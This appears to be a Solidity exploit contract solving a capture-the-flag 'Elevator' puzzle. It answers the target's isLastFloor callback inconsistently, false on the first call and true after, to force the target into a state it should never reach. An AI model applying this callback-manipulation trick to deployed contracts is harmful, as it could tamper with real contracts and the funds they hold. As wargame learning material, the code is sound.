contract CheatBuilding is Building{
    uint public firstCall;

    function isLastFloor(uint x) override external returns(bool) {
        if(firstCall == 0){
            firstCall++;
            return false;
        }
        return true;
    }

    function cheat(address _adr, uint x) public {
        Elevator elevator = Elevator(_adr);
        elevator.goTo(x);
        elevator.goTo(x);
    }
}
